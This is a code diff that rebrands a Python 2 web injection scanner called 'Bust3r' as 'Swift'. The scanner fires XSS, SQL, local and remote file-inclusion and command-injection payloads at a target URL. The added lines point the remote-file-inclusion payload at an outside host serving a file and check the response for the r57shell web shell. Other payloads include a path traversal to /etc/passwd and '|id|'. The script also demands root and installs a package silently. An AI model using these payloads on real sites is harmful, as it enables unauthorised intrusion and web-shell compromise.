@@ -1,16 +1,12 @@
-#!/usr/bin/env python
+#!/usr/bin/python
 # -*- coding: UTF-8 -*-
+
+#contains a = it checks LFI,XSS,RFI,SQL,CMD injection 
+#searching source (simple)  
 from sgmllib import SGMLParser
-import os, sys, urllib, httplib, re, urllib2, sets, socket, subprocess, ConfigParser
+import sys, urllib, httplib, re, urllib2, sets, socket, os
 from termcolor import colored
 os.system("pip install colored")
-print ""
-if raw_input ("Open Your WebBrowser? [y/n]: ").lower()[0]=='y': # List of Browsers
-	os.system('firefox')
-	os.system('Chrome')
-	os.system('iceweasel')
-else:
-	pass
 
 if not os.geteuid() == 0:
 	sys.exit('Script must be run as root')
@@ -28,26 +24,28 @@ COLOR_CYAN      = 6
 COLOR_WHITE     = 7
 COLOR_RESET     = 9
 
+#os.system("firefox")
+#os.system("iceweasle")			#Comment out what you don't have
+#os.system("chrome")
 print colored("""
- ▄▄▄▄    █    ██   ██████ ▄▄▄█████▓▓█████  ██▀███     
-▓█████▄  ██  ▓██▒▒██    ▒ ▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒   
-▒██▒ ▄██▓██  ▒██░░ ▓██▄   ▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒   
-▒██░█▀  ▓▓█  ░██░  ▒   ██▒░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄     
-░▓█  ▀█▓▒▒█████▓ ▒██████▒▒  ▒██▒ ░ ░▒████▒░██▓ ▒██▒   
-░▒▓███▀▒░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░  ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░   
-▒░▒   ░ ░░▒░ ░ ░ ░ ░▒  ░ ░    ░     ░ ░  ░  ░▒ ░ ▒░   
- ░    ░  ░░░ ░ ░ ░  ░  ░    ░         ░     ░░   ░    
- ░         ░           ░              ░  ░   ░        
-      ░                                             
-       """,'blue')
-                         
-print """
-~~=[ Bust3r - XSS, SQL, LFI, RFI Injector 
-~~=[ v1.5 - 'RedFox'"""
-print colored("~~=[ coders: @_r0ot_, @DrDeadPatch",'cyan')
-print colored("~~=[ https://github.com/r0otshell, https://github.com/LucidScorpion",'yellow')
-socket.setdefaulttimeout(5)
+  ██████  █     █░ ██▓  █████▒▄▄▄█████▓
+▒██    ▒ ▓█░ █ ░█░▓██▒▓██   ▒ ▓  ██▒ ▓▒
+░ ▓██▄   ▒█░ █ ░█ ▒██▒▒████ ░ ▒ ▓██░ ▒░
+  ▒   ██▒░█░ █ ░█ ░██░░▓█▒  ░ ░ ▓██▓ ░ 
+▒██████▒▒░░██▒██▓ ░██░░▒█░      ▒██▒ ░ 
+▒ ▒▓▒ ▒ ░░ ▓░▒ ▒  ░▓   ▒ ░      ▒ ░░   
+░ ░▒  ░ ░  ▒ ░ ░   ▒ ░ ░          ░    
+░  ░  ░    ░   ░   ▒ ░ ░ ░      ░      
+      ░      ░     ░                  
+""",'blue')
 
+print """
+~~=[ Swift - XSS, SQL, LFI, RFI Injector 
+~~=[ v1.5 - 'Blackvortex'"""
+print colored("~~=[ coders: @_r0ot_, @DrDeadPatch, @_b00geyman_",'cyan')
+print colored("~~=[ https://github.com/@officialUniversalCoders",'yellow')
+socket.setdefaulttimeout(5)
+ 
 class URLLister(SGMLParser):
    def reset(self):
       SGMLParser.reset(self)
@@ -83,7 +81,7 @@ def main(host):
       if verbose == 1:
          print "[+] Checking XSS" 
       xss(host) 
-   except(urllib2.HTTPError, urllib2.URLError), msg:
+   except(urllib2.HTTPError, urllib2.URLError), msg: 
       #print "[-] XSS Error:",msg 
       pass
    try:
@@ -119,7 +117,7 @@ def rfi(host):
  
    try: 
       source = urllib2.urlopen(host+RFI).read() 
-      if re.search("r57shell", source): #using a different shell change this line
+      if re.search("r57shell", source): 
          print "[+] RFI:",host+RFI
       else: 
          if verbose == 1:
@@ -167,22 +165,22 @@ def lfi(host):
    else: 
       if verbose == 1:
          print "[-] Not Vuln. w/  Null Byte" 
-
+ 
+print "\n-------------------------------------------------\n"
  
 if len(sys.argv) not in [2,3]:
-   print ""
-   print colored("Usage : ./bust3r.py <site> [option]",'red')
-   print "\t[Option]"
-   print "\t [-v] | Verbose Output\n"
-   print "Example:" 
-   print colored("\t./bust3r.py [url] -verbose", 'white')
-   print ""
+   print colored("Usage : ./Swift.py <site> [option]",'red')
+   print colored("Ex: ./swift.py [url]http://www.google.com[/url] -verbose",'white')
+   print "\n\t[Option]"
+   print "\t\t-verbose/-v | Verbose Output\n"
    sys.exit(1)
-
+ 
 LFI = "../../../../../../../../../../../../etc/passwd" 
+RFI = "http://yozurino.com/r.txt?" 
+RFI_TITLE = "Target" 
 XSS = "%22%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E" 
 CMD = "|id|"
-SQL = ["-1","999999"] #Add more or change sql payloads
+SQL = ["-1","999999"] 
  
 site = sys.argv[1].replace("\n","")
 print "\n[+] Collecting:",site
